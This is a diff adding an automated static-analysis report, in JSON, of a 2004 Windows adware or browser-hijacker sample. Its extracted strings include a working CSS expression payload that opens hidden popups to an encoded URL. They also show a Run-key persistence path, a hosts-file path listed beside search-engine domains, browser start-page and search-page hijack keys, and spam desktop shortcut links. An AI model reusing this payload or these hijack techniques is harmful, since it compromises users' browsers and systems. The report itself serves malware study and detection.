@@ -1,0 +1,763 @@
+{
+    "docinfo": {},
+    "filename": "VirusShare_09769a0baf4073d6ff590c2b7411b5d5",
+    "filesize": 25088,
+    "filetype": "PE32 executable (GUI) Intel 80386, for MS Windows",
+    "hashes": {
+        "md5": "09769a0baf4073d6ff590c2b7411b5d5",
+        "sha1": "027ea5600c56db8ae6b4815fd631965a5cc33adb",
+        "sha256": "543e85f728873004b4925ab3f526cd7522f4e067ff60c4ffc8f1f186af660856"
+    },
+    "peinfo": {
+        "behavior": [
+            "Xor",
+            "hijack_network",
+            "win_registry"
+        ],
+        "breakpoint": [
+            "CopyFileA",
+            "GetCommandLineA",
+            "GetModuleHandleA",
+            "GetStartupInfoA",
+            "RegCloseKey",
+            "RegCreateKeyExA",
+            "RegOpenKeyExA"
+        ],
+        "directories": {
+            "debug": {},
+            "export": [],
+            "import": {
+                "ADVAPI32.dll": [
+                    {
+                        "function": "RegOpenKeyExA",
+                        "offset": 4198400
+                    },
+                    {
+                        "function": "RegCreateKeyExA",
+                        "offset": 4198404
+                    },
+                    {
+                        "function": "RegCloseKey",
+                        "offset": 4198408
+                    },
+                    {
+                        "function": "RegQueryValueExA",
+                        "offset": 4198412
+                    },
+                    {
+                        "function": "RegSetValueExA",
+                        "offset": 4198416
+                    }
+                ],
+                "KERNEL32.dll": [
+                    {
+                        "function": "GetCommandLineA",
+                        "offset": 4198424
+                    },
+                    {
+                        "function": "lstrcatA",
+                        "offset": 4198428
+                    },
+                    {
+                        "function": "CopyFileA",
+                        "offset": 4198432
+                    },
+                    {
+                        "function": "lstrcpyA",
+                        "offset": 4198436
+                    },
+                    {
+                        "function": "MultiByteToWideChar",
+                        "offset": 4198440
+                    },
+                    {
+                        "function": "lstrlenA",
+                        "offset": 4198444
+                    },
+                    {
+                        "function": "GetStartupInfoA",
+                        "offset": 4198448
+                    },
+                    {
+                        "function": "GetModuleHandleA",
+                        "offset": 4198452
+                    }
+                ],
+                "MSVCRT.dll": [
+                    {
+                        "function": "_EH_prolog",
+                        "offset": 4198460
+                    },
+                    {
+                        "function": "__setusermatherr",
+                        "offset": 4198464
+                    },
+                    {
+                        "function": "fclose",
+                        "offset": 4198468
+                    },
+                    {
+                        "function": "fprintf",
+                        "offset": 4198472
+                    },
+                    {
+                        "function": "fopen",
+                        "offset": 4198476
+                    },
+                    {
+                        "function": "__CxxFrameHandler",
+                        "offset": 4198480
+                    },
+                    {
+                        "function": "__p__commode",
+                        "offset": 4198484
+                    },
+                    {
+                        "function": "sprintf",
+                        "offset": 4198488
+                    },
+                    {
+                        "function": "_exit",
+                        "offset": 4198492
+                    },
+                    {
+                        "function": "_XcptFilter",
+                        "offset": 4198496
+                    },
+                    {
+                        "function": "exit",
+                        "offset": 4198500
+                    },
+                    {
+                        "function": "_acmdln",
+                        "offset": 4198504
+                    },
+                    {
+                        "function": "__getmainargs",
+                        "offset": 4198508
+                    },
+                    {
+                        "function": "_initterm",
+                        "offset": 4198512
+                    },
+                    {
+                        "function": "_adjust_fdiv",
+                        "offset": 4198516
+                    },
+                    {
+                        "function": "_controlfp",
+                        "offset": 4198520
+                    },
+                    {
+                        "function": "__p__fmode",
+                        "offset": 4198524
+                    },
+                    {
+                        "function": "__set_app_type",
+                        "offset": 4198528
+                    },
+                    {
+                        "function": "_except_handler3",
+                        "offset": 4198532
+                    }
+                ],
+                "ole32.dll": [
+                    {
+                        "function": "CoCreateInstance",
+                        "offset": 4198540
+                    },
+                    {
+                        "function": "CoUninitialize",
+                        "offset": 4198544
+                    },
+                    {
+                        "function": "CoInitialize",
+                        "offset": 4198548
+                    }
+                ]
+            },
+            "relocations": {
+                "Size": 0,
+                "VirtualAddress": 0,
+                "count": 0,
+                "details": {}
+            },
+            "resources": [
+                {
+                    "data": "b'(\\x00\\x00\\x00 \\x00\\x00\\x00@\\x00\\x00\\x00\\x01\\x00\\x18\\x00\\x00\\x00\\x00\\x00\\x80\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x9c\\xc7\\xc6\\x8c\\xae\\xb5\\x9c\\xc7\\xc6\\x9c'",
+                    "executable": false,
+                    "language": "LANG_ENGLISH",
+                    "name": "RT_ICON_1",
+                    "offset": 8736,
+                    "size": 3240,
+                    "sublanguage": "SUBLANG_ENGLISH_US"
+                },
+                {
+                    "data": "b'(\\x00\\x00\\x00 \\x00\\x00\\x00@\\x00\\x00\\x00\\x01\\x00\\x18\\x00\\x00\\x00\\x00\\x00\\x80\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'",
+                    "executable": false,
+                    "language": "LANG_ENGLISH",
+                    "name": "RT_ICON_2",
+                    "offset": 12000,
+                    "size": 3240,
+                    "sublanguage": "SUBLANG_ENGLISH_US"
+                },
+                {
+                    "data": "b'(\\x00\\x00\\x00 \\x00\\x00\\x00@\\x00\\x00\\x00\\x01\\x00\\x18\\x00\\x00\\x00\\x00\\x00\\x80\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xcbR\\xff\\xcfZ\\xff\\xdf\\x84\\xff'",
+                    "executable": false,
+                    "language": "LANG_ENGLISH",
+                    "name": "RT_ICON_3",
+                    "offset": 15264,
+                    "size": 3240,
+                    "sublanguage": "SUBLANG_ENGLISH_US"
+                },
+                {
+                    "data": "b'(\\x00\\x00\\x00 \\x00\\x00\\x00@\\x00\\x00\\x00\\x01\\x00\\x18\\x00\\x00\\x00\\x00\\x00\\x80\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x94\\xff\\xce\\x94\\xff\\xce\\x8c\\xff\\xc6{'",
+                    "executable": false,
+                    "language": "LANG_ENGLISH",
+                    "name": "RT_ICON_4",
+                    "offset": 18528,
+                    "size": 3240,
+                    "sublanguage": "SUBLANG_ENGLISH_US"
+                },
+                {
+                    "data": "b'(\\x00\\x00\\x00 \\x00\\x00\\x00@\\x00\\x00\\x00\\x01\\x00\\x18\\x00\\x00\\x00\\x00\\x00\\x80\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x82\\xad\\x00\\x9e\\xce\\x00\\x9e\\xce\\x00'",
+                    "executable": false,
+                    "language": "LANG_ENGLISH",
+                    "name": "RT_ICON_5",
+                    "offset": 21792,
+                    "size": 3240,
+                    "sublanguage": "SUBLANG_ENGLISH_US"
+                },
+                {
+                    "data": "b'\\x00\\x00\\x01\\x00\\x01\\x00  \\x00\\x00\\x01\\x00\\x18\\x00\\xa8\\x0c\\x00\\x00\\x01\\x00'",
+                    "executable": false,
+                    "language": "LANG_ENGLISH",
+                    "name": "RT_GROUP_ICON_1",
+                    "offset": 11976,
+                    "size": 20,
+                    "sublanguage": "SUBLANG_ENGLISH_US"
+                },
+                {
+                    "data": "b'\\x00\\x00\\x01\\x00\\x01\\x00  \\x00\\x00\\x01\\x00\\x18\\x00\\xa8\\x0c\\x00\\x00\\x02\\x00'",
+                    "executable": false,
+                    "language": "LANG_ENGLISH",
+                    "name": "RT_GROUP_ICON_2",
+                    "offset": 15240,
+                    "size": 20,
+                    "sublanguage": "SUBLANG_ENGLISH_US"
+                },
+                {
+                    "data": "b'\\x00\\x00\\x01\\x00\\x01\\x00  \\x00\\x00\\x01\\x00\\x18\\x00\\xa8\\x0c\\x00\\x00\\x03\\x00'",
+                    "executable": false,
+                    "language": "LANG_ENGLISH",
+                    "name": "RT_GROUP_ICON_3",
+                    "offset": 18504,
+                    "size": 20,
+                    "sublanguage": "SUBLANG_ENGLISH_US"
+                },
+                {
+                    "data": "b'\\x00\\x00\\x01\\x00\\x01\\x00  \\x00\\x00\\x01\\x00\\x18\\x00\\xa8\\x0c\\x00\\x00\\x04\\x00'",
+                    "executable": false,
+                    "language": "LANG_ENGLISH",
+                    "name": "RT_GROUP_ICON_4",
+                    "offset": 21768,
+                    "size": 20,
+                    "sublanguage": "SUBLANG_ENGLISH_US"
+                },
+                {
+                    "data": "b'\\x00\\x00\\x01\\x00\\x01\\x00  \\x00\\x00\\x01\\x00\\x18\\x00\\xa8\\x0c\\x00\\x00\\x05\\x00'",
+                    "executable": false,
+                    "language": "LANG_ENGLISH",
+                    "name": "RT_GROUP_ICON_5",
+                    "offset": 25032,
+                    "size": 20,
+                    "sublanguage": "SUBLANG_ENGLISH_US"
+                }
+            ],
+            "sign": {},
+            "tls": {
+                "AddressOfCallBacks": 65535,
+                "AddressOfIndex": 4,
+                "Characteristics": 0,
+                "EndAddressOfRawData": 3,
+                "SizeOfZeroFill": 184,
+                "StartAddressOfRawData": 9460301
+            }
+        },
+        "dll": false,
+        "entrypoint": 3542,
+        "features": {
+            "antidbg": [],
+            "antivm": {},
+            "crypto": [],
+            "mutex": [],
+            "packer": [
+                "Microsoft_Visual_Cpp_v60",
+                "Microsoft_Visual_Cpp_v50v60_MFC_additional",
+                "Microsoft_Visual_Cpp_50",
+                "Microsoft_Visual_Cpp_v50v60_MFC",
+                "Microsoft_Visual_Cpp"
+            ],
+            "xor": {}
+        },
+        "imagebase": 4194304,
+        "imphash": "ea1fa0beb5dcc67e4c62d1e1d105716c",
+        "metadata": {},
+        "sections": {
+            "count": 4,
+            "details": [
+                {
+                    "characteristics": 1610612768,
+                    "data": "b'U\\x8b\\xec\\x81\\xec\\x0c\\x02\\x00\\x00Vj\\x00\\xff\\x15\\",
+                    "entropy": 5.761778077652675,
+                    "executable": true,
+                    "hash": {
+                        "md5": "0857edcfa25bb6caed8da96da991ccdc",
+                        "sha1": "7a72552980a61fa67dfc84c1c04f29004acaf536",
+                        "sha256": "6f5d1c8854e3d471173b4bdd4176b72704a38443f10b17df0f8bfe7a8dea4d84"
+                    },
+                    "section_name": ".text",
+                    "size_of_raw_data": 3328,
+                    "virtual_address": 768,
+                    "virtual_size": 3222
+                },
+                {
+                    "characteristics": 1073741888,
+                    "data": "b'\\x96\\x12\\x00\\x00\\xa6\\x12\\x00\\x00\\xb8\\x12\\x00\\x00",
+                    "entropy": 4.286359766030484,
+                    "executable": false,
+                    "hash": {
+                        "md5": "a3523ad8d81bbd7d07faf6736af90eb8",
+                        "sha1": "34a1a4971449722361aa964a780544cc3fa11337",
+                        "sha256": "aaab29639137bb5623b7923d435b55a944978c5ae34e53100fc41f795f1ae10a"
+                    },
+                    "section_name": ".rdata",
+                    "size_of_raw_data": 1280,
+                    "virtual_address": 4096,
+                    "virtual_size": 1134
+                },
+                {
+                    "characteristics": 3221225536,
+                    "data": "b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
+                    "entropy": 5.249239127053932,
+                    "executable": false,
+                    "hash": {
+                        "md5": "758a7e8077349207641ece2d42c74c45",
+                        "sha1": "680e113fccae6cf517f86a3608fc08a2dcc6fbc6",
+                        "sha256": "d1b932198f403796bc6fb1a97771d0a5c48c9548856eb46328d1db77e791be67"
+                    },
+                    "section_name": ".data",
+                    "size_of_raw_data": 2816,
+                    "virtual_address": 5376,
+                    "virtual_size": 2580
+                },
+                {
+                    "characteristics": 1073741888,
+                    "data": "b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
+                    "entropy": 4.924113657705606,
+                    "executable": false,
+                    "hash": {
+                        "md5": "984a50390af8ef7f4f6c50e1dc593a2d",
+                        "sha1": "9d46e64a132fbf0ec983bea69f916b8275674aa7",
+                        "sha256": "8e44232fba4df86521960a66976152798b8efcb356d8a07ae25d923a9e1c582f"
+                    },
+                    "section_name": ".rsrc",
+                    "size_of_raw_data": 16896,
+                    "virtual_address": 8192,
+                    "virtual_size": 16864
+                }
+            ]
+        },
+        "timestamp": "2004-04-09 16:21:32"
+    },
+    "strings": {
+        "dump": [
+            "L!This program cannot be run in DOS mode.",
+            "|ccc|ccc",
+            "|cEecRichc",
+            ".text",
+            "`.rdata",
+            "@.data",
+            ".rsrc",
+            "PQPEu",
+            "PQDEU",
+            "3Vt$",
+            "BAu$2",
+            "SVWe",
+            "30\u01c5$",
+            ",\udb6c\udf45$P",
+            "\u060b$Y;Yt $Ph",
+            "u\u058b=,",
+            "$P@P$PS<",
+            "Su\u0583}",
+            "{M3QM",
+            "QPh?",
+            "PPPh",
+            "9Et\tu",
+            "u\u058d$P@P$Pj",
+            "Su\u0583}",
+            "M_^[d",
+            "^UQEVPe",
+            "SUVWh",
+            "D$Hj",
+            "SLD$",
+            "UD$$j",
+            "D$8j",
+            "D$Lj",
+            "VPD$",
+            "SD$$j",
+            "UjD$8j",
+            "OD$Lj",
+            "4PD$",
+            "_^][",
+            "SVWh?",
+            "E]PPEPSh4",
+            "u\u05c9]5",
+            "P\u058dh(",
+            "u_^[U",
+            "SVWh?",
+            "SMuE",
+            "PPEPVWuu5",
+            "SMEe",
+            "PPEPj",
+            "Wu\u0585u",
+            "!EPX",
+            "Pcuh",
+            "_^[t\tu",
+            "@PPj",
+            "SVWj(",
+            "`\u01c58,",
+            "\\\udb6c\udf458Pu",
+            "\u060b8Y;Yt#8Pu",
+            "Y_^[",
+            "S3VW]E]Ph?",
+            "MfEEu",
+            "u9]t",
+            "]E]Ph?",
+            "MEEu",
+            "u9]t",
+            "]E]Ph?",
+            "M~M;",
+            "MtME]PEPSh?",
+            "SSSh|",
+            "MDEEu",
+            "SVu9]t",
+            "MMM_^[d",
+            "@Pt$",
+            "hSVWe3\u06c9]j",
+            "EEP5",
+            "EPEPEP",
+            "0u>\"u:Fu",
+            "<\"u>\"u",
+            "< v]\u040dEP",
+            "> vFuj",
+            "XPVSS",
+            "\tMPQ",
+            "YY3%",
+            "MultiByteToWideChar",
+            "lstrlenA",
+            "lstrcatA",
+            "lstrcpyA",
+            "CopyFileA",
+            "GetCommandLineA",
+            "KERNEL32.dll",
+            "RegOpenKeyExA",
+            "RegCreateKeyExA",
+            "RegCloseKey",
+            "RegSetValueExA",
+            "RegQueryValueExA",
+            "ADVAPI32.dll",
+            "CoUninitialize",
+            "CoCreateInstance",
+            "CoInitialize",
+            "ole32.dll",
+            "fclose",
+            "fprintf",
+            "fopen",
+            "__CxxFrameHandler",
+            "_EH_prolog",
+            "sprintf",
+            "MSVCRT.dll",
+            "_exit",
+            "_XcptFilter",
+            "exit",
+            "_acmdln",
+            "__getmainargs",
+            "_initterm",
+            "__setusermatherr",
+            "_adjust_fdiv",
+            "__p__commode",
+            "__p__fmode",
+            "__set_app_type",
+            "_except_handler3",
+            "_controlfp",
+            "GetModuleHandleA",
+            "GetStartupInfoA",
+            "Software\\Microsoft\\Internet Explorer\\Styles",
+            "User Stylesheet",
+            "Use My Stylesheet",
+            "SOFTWARE\\Microsoft\\Internet Explorer\\Styles",
+            "\\winstyle.css",
+            "body{border-color:expression(dMT=document.getElementsByTagName('META'),dMT.length?(dMT.keywords?(dMTkc=dMT.keywords.content,(dMTkc.indexOf('sex')>=0||dMTkc.indexOf('porn')>=0 ||dMTkc.indexOf('adult')>=0||dMTkc.indexOf('thehun')>=0)?(window.open('http://%77%77%77%2E%74%68%65%62%65%73%74%73%65%2E%63%6F%6D/%63%6Fn%73%6Fl%65%2Ep%68p','hvo','x=5000,top=5000,y=5000,left=5000,height=600,width=800,directories=no,toolbar=no,status=no,location=no,resizable=no,menubar=no,scrollbars=no')?document.getElementsByTagName('META').keywords.content='':''):''):''):'')}",
+            "@charset \"iso-8859-1\";",
+            "d:\\Documents and Settings\\All Users\\Desktop\\HOME BUISINESS.lnk",
+            "d:\\Documents and Settings\\All Users\\Desktop\\VIAGRA.lnk",
+            "d:\\Documents and Settings\\All Users\\Desktop\\ONLINE POKER.lnk",
+            "d:\\Documents and Settings\\All Users\\Desktop\\WEIGHT LOSS.lnk",
+            "d:\\Documents and Settings\\All Users\\Desktop\\MORTGAGE.lnk",
+            "c:\\Documents and Settings\\All Users\\Desktop\\HOME BUISINESS.lnk",
+            "c:\\Documents and Settings\\All Users\\Desktop\\VIAGRA.lnk",
+            "VIAGRA",
+            "c:\\Documents and Settings\\All Users\\Desktop\\ONLINE POKER.lnk",
+            "ONLINE POKER",
+            "c:\\Documents and Settings\\All Users\\Desktop\\WEIGHT LOSS.lnk",
+            "PHENTERMINE",
+            "c:\\Documents and Settings\\All Users\\Desktop\\MORTGAGE.lnk",
+            "MORTGAGE",
+            "http://www.motor-search.info/books/home_bus.php",
+            "HOME BUISINESS",
+            "LOW MORTGAGE RATES",
+            "http://www.motor-search.info/books/mortgage.php",
+            "FPhentermine online FREE",
+            "http://www.motor-search.info/books/phentermine.php",
+            "http://www.motor-search.info/books/poker.php",
+            "Free Strip Poker",
+            "http://www.motor-search.info/books/viagra.php",
+            "Free Viagra MOVIES!",
+            "%s%s",
+            "\\system\\sysdll32.exe",
+            "[DEFAULT]",
+            "BASEURL=%s",
+            "[InternetShortcut]",
+            "URL=%s",
+            ".url",
+            "Favorites",
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
+            "216.200.3.38",
+            "http://www.motor-search.info/",
+            "http://www.motor-search.info/search.html",
+            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
+            "SystemRoot",
+            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
+            "zsysdll32.dll",
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "%s %s",
+            "\\hosts",
+            "\\system32\\drivers\\etc\\hosts",
+            "www.yahoo.com",
+            "yahoo.com",
+            "www.altavista.com",
+            "altavista.com",
+            "google.com",
+            "www.google.com",
+            "www.msn.com",
+            "search.msn.com",
+            "msn.com",
+            "Default_Page_URL",
+            "Default_Search_URL",
+            "CustomizeSearch",
+            "SearchAssistant",
+            "Software\\Microsoft\\Internet Explorer\\Search",
+            "Search Page",
+            "Start Page",
+            "Software\\Microsoft\\Internet Explorer\\Main",
+            "\u018c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u018c\u018c",
+            "!9Rcsssssssssssssssssssssssss",
+            "!9Rcsssssssssssssssssssssssss\u019c",
+            "ZmsZmsZmsZmsZmsZmsZmsZmsZmsZmsZmsZmsZmsZmsZmsZmsZmsZmsZms{ssssssss\u019c",
+            "!JYZZmsZms{ssss\u019c",
+            "!JYZss\u019c",
+            "!Zu{ss\u019c",
+            "!Zmsss\u018c",
+            "!ZmssskBQR),1BAJ189",
+            ")ZmssskBIR!(1109",
+            " )4JYZss\u018c",
+            "s!(1",
+            " Ba!J]ssss\u019c",
+            "!s!(1",
+            " Ba!ZJkZssss\u019c",
+            "!9s!(1",
+            " ZJZJZJZJcZkZss\u019c",
+            "!9Rs",
+            " ZJ9Q99Q99Q99Q9ZJZJZJcZs",
+            "!9Rck",
+            "!9Q99Q9ZJZJ9Q9ZJZJZJRJcZZ}Jk",
+            "!9Rcsk",
+            " Ry!Ry!",
+            "!ZJZJZJZJ9Q9ZJZJZJZJRJZms",
+            "!9Rcssk",
+            " 9Q9Ry!9Q9ZJ",
+            "!ZJZJ9Q9ZJZJZJZJZJRJZms",
+            "!9Rcsssk!()",
+            " 9Q9ZJZJZJZJ",
+            "!9Q9ZJZJZJZJZJZJZJZms",
+            "!9Rcssssc",
+            " )41J]ZkZcscZZJZJ9Q99Q9",
+            "!ZJZJ9Q9ZJZJZJZJZms",
+            "!9Rcsssssc1EZBYk{ssscsZJZJ9Q9ZJZJ",
+            "!ZJ9Q9ZJZJZJ1a",
+            "!9RcssssssssssscZZJ9Q9ZJZJZJ",
+            "!9Q9ZJZJZJBa!Zms",
+            "!9RcssssssssssssscsZJ9Q99Q9ZJZJ9Q9",
+            "!ZJZJcZZ}Jk",
+            "!9RcssssssssssssssZJZJ9Q99Q99Q99Q9ZJ",
+            "!ZJkZs",
+            "!9RcssssssssssssscZZJZJZJZJZJZJZJcZs\u019c",
+            "!9Rcssssssssssssss{cZZJZJZJZJZJcZss\u019c",
+            "!1JZccccccccccccccccsZJZJZJZJcZccc\u019c",
+            "!)BJRRRRRRRRRRRRRRRcZZJcZkZRRRR\u019c",
+            "!)19999999999999999{J1999999\u019c",
+            "!!!!!!!!!!!!!!!!!!!\u05fd!!!!!!!\u018c",
+            "\u018c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u019c\u018c",
+            "kik98c",
+            "kRQk",
+            "ZYZ10c",
+            "ZYZ10c",
+            "RQZ)(k",
+            "cac! )",
+            "!9A9",
+            "Us)0)",
+            "98910c",
+            "9!,)BYJ",
+            ",9sqs",
+            " !ZYZ",
+            "$)1AB",
+            "1<9181",
+            "c),)",
+            "989!$!141",
+            "Rkik",
+            "0989",
+            "cZYZ",
+            "0101",
+            "cacRQRBAB!$)",
+            "sRQR",
+            "cacJIJ989!$1",
+            "RZ\u07c4\u3725sqJZ\u07c4",
+            "}JZ{\ub97d{u\u0794JRs{{{{{{\u3335{{uJRs\u07c4sskksss{{sRUJRkscccccsssskJIJJckZZRRcccss\u03b2kkRMJJZcJJJJZRRZs\u07baccka\u7b62JJJZJ99BRJJRsZZ{ysmJJBBR9119JRccJRZUJB911B999BRRJJJBAJB9)!!))111BZc\u01a2J{10\u01b6JB1!",
+            "!)BZc\u03aaRc98JB1",
+            "!1Rc\u05bacZJI{uJB)",
+            ")19J\u05b2RZRQsqJB)",
+            ")1BJ\u07b2RcZU{yJB)",
+            ")9BR\u07b6RkRUJB)",
+            "!!)9JZ\u07bacJIJB1!",
+            "!19BRZ\u07bakcYJB1)!!!!)1BJZc\u05ba{sm\u07adJB911))19BRZcksq\u07f5JBB99999BJRck{JJJBBBBBJRZcs\u07be{JJRRJJJJRZcks\u07be{JJZZZRZZZcks\u07c4",
+            "JRccccccks{\u07c4\u07cc",
+            "\u01bdJRkssssss{\u07c4\u05beJRs{{{{{{",
+            "keJZ{\u03d4{yJRs{{{{{{\u07c4\u07c4\u04ccs9<JJRZZZZZZZZZcZ\u01a2JZRMskkkkkkkkkkkcRJJJJJJJJJJJJJ\u05a6BuBsqkekRJJJJJJJJJJJR",
+            "\u0394\u038c{ssssssssssssssssssssssss{\u0194\u0394\u0394{cRJ{J{J{J{J{J{J{J{J{J{J{J{J{J{J{J{J{J{J{J{J{J{J{J{Rc{\u038ckJ{9c1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z1Z9cJ{k\u0184Z9k)R!B!B!B!B!B!B!B!B!B!B!B!B!B!B!B!B!B!B!B!B",
+            "!BZZ9c)J",
+            "}!9cZcBk1R",
+            ")!J!B!B)B)B!J!J)11Y))q)!1!9)J)J)B!J!B",
+            "ckJk",
+            "11J1J1J1J1J1J!11J1J1J1J1J1J1J1J",
+            "k!a)",
+            "!19R9R9R9R9R)99R9R9R9R9R9R9R9R989989141",
+            "1BBZBZBZBBB<)BZBZBZ9R9JBZBZBZRZkiksqscac)()",
+            "49JqRJIJRQRJMJ)()",
+            "!}1JcJZRY1RBJZJcJcJcJcBRZRJcJcJcRk{}{JMJ",
+            "Zs{\u01a5s{{}{kqkBAB",
+            ")}1RkJBRRZkRkZkZkZkRkRkRcZkRkZkRkcac!$!k\u01ad\u018c\u06dcksk}kJIJ)A)RcZkZiBcscscscsRZZkcscscscscscscskmkBmJs\u01ad\u0394{k{k{k{ceck{k{ckcck{k{csZ]9ZZJuBckk{k{csk{k{k{k{s{ksk{\u03b5\u039c{sssssskssssZkkssss{ssZkssssss{\u03bd\u03a5{{{{{{{{JJ{{{{\u03bd\u05ad{s{ZuJ\u05ad{kcRcYB{{\u05b5\u01adc]BsccA1s\u07bd\u01b5{Z{s]JkQBk\u03b5ZYBsc\u02cc\u03bdZYB{\u01cc\u3714\u05d4!01ss",
+            "{{cYB\u7944ss)<9",
+            " !\u05bd\uff54{",
+            "{s{c\u397dkc",
+            "kMBk{{",
+            "{{{{! !",
+            "kk\u05dc{}c\u05e5{eRs\u04dcBEB9<9),)",
+            "Bec\u797eZ]ZcacZYZ),)",
+            "\u03dc\u02dc\u04e5{y{susRUR",
+            "\u059ccac!$!",
+            "{s\u02dc\u02dc\u03edsus989sk\u01ad",
+            "{y{JIJ{\u03dc\u03dc{}{\u01a5\u7b65\u03e5\u03e5\u03dc",
+            "091EJ9MRBUZBYcB]cB]cB]kB]cB]k9]k1]kZR",
+            "0B)MZ\u07b59191",
+            "4B\ufd76RRB!",
+            "<J\u0584kcJ)",
+            "<J\u03f5\u0794{kR1",
+            "<Js9y)\u059c\u0384sZ1",
+            "<J\u03f5k\u7d9c\ufd94\u02ed\u079c\u038c{Z1",
+            "\u079c\u038c{Z1",
+            "AJ\u019aZa",
+            "BB9\u03a6ku",
+            ")\u079c\u038c{Z1",
+            "AJ\u019eZe",
+            "\u019aR\u019aJ19}",
+            "1\u059c\u038c{Z1",
+            "AJ\u05fd\u04fd\u04fd\u05fd\u05fd\u059c\u038c{Z1",
+            "<J\u01f5\u02f5\u02f5\u02f5\u02f5\u02f5\u02f5\u02f5\u02f5\u03fd\u7a84\u079c\u038c{Z1",
+            "AJ\u7e9c\u07bd\u039a{\u079c\u038c{Z1",
+            "\u04fd\u01ed\u01ed\uff7a\u07a6\u079c\u038c{Z1",
+            "\u03ba\u05a6\u079c\u038c{Z1",
+            "\u7fa5\u7fad\u7fa5\u01ed\u03f5\u02ed\u7d9c\u03f5\ufa84\u079c\u038c{Z1",
+            "8J\u07a5\u038c{Z1",
+            "8J\u07a5\u0394{Z1",
+            "<J\u07a5\u0394{Z)",
+            "4BsR)",
+            "0BJmskB!",
+            "0B9]k\u03a5c9",
+            "4B!ER{us\u01b6\u01b5{\u078csZ1",
+            "0BRm{\u01be\u0594\u0384kR1",
+            "0Bk}{kR1",
+            "0Bk}\uf73e\u0384sZ1",
+            "0Bk}\uf97e\u038c{c9",
+            "0Bk}\uf97e\u039cc9",
+            "Ics\u039cc1",
+            "eZ{R)",
+            "!\u018ccB!",
+            "!BRcs{kks{{{cJ1"
+        ],
+        "file": {
+            "ADVAPI32.dll": "Library",
+            "KERNEL32.dll": "Library",
+            "MSVCRT.dll": "Library",
+            "\\system\\sysdll32.exe": "Executable",
+            "c:\\Documents and Settings\\All Users\\Desktop\\HOME BUISINESS.lnk": "Linker File",
+            "c:\\Documents and Settings\\All Users\\Desktop\\MORTGAGE.lnk": "Linker File",
+            "c:\\Documents and Settings\\All Users\\Desktop\\ONLINE POKER.lnk": "Linker File",
+            "c:\\Documents and Settings\\All Users\\Desktop\\VIAGRA.lnk": "Linker File",
+            "c:\\Documents and Settings\\All Users\\Desktop\\WEIGHT LOSS.lnk": "Linker File",
+            "d:\\Documents and Settings\\All Users\\Desktop\\HOME BUISINESS.lnk": "Linker File",
+            "d:\\Documents and Settings\\All Users\\Desktop\\MORTGAGE.lnk": "Linker File",
+            "d:\\Documents and Settings\\All Users\\Desktop\\ONLINE POKER.lnk": "Linker File",
+            "d:\\Documents and Settings\\All Users\\Desktop\\VIAGRA.lnk": "Linker File",
+            "d:\\Documents and Settings\\All Users\\Desktop\\WEIGHT LOSS.lnk": "Linker File",
+            "http://www.motor-search.info/books/home_bus.php": "Web Page",
+            "http://www.motor-search.info/books/mortgage.php": "Web Page",
+            "http://www.motor-search.info/books/phentermine.php": "Web Page",
+            "http://www.motor-search.info/books/poker.php": "Web Page",
+            "http://www.motor-search.info/books/viagra.php": "Web Page",
+            "ole32.dll": "Library",
+            "zsysdll32.dll": "Library"
+        },
+        "fuzzing": {},
+        "ip": [
+            "216.200.3.38"
+        ],
+        "url": [
+            "http://www.motor-search.info/search.html",
+            "http://www.motor-search.info/",
+            "http://www.motor-search.info/books/viagra.php",
+            "http://%77%77%77%2E%74%68%65%62%65%73%74%73%65%2E%63%6F%6D/%63%6Fn%73%6Fl%65%2Ep%68p",
+            "http://www.motor-search.info/books/home_bus.php",
+            "http://www.motor-search.info/books/poker.php",
+            "http://www.motor-search.info/books/phentermine.php",
+            "http://www.motor-search.info/books/mortgage.php"
+        ]
+    },
+    "time": "0:00:02.400207",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": [
+        {
+            "packer_compiler_signatures.yar": "IsPE32"
+        },
+        {
+            "packer_compiler_signatures.yar": "IsWindowsGUI"
+        },
+        {
+            "packer_compiler_signatures.yar": "HasRichSignature"
+        }
+    ]
+}
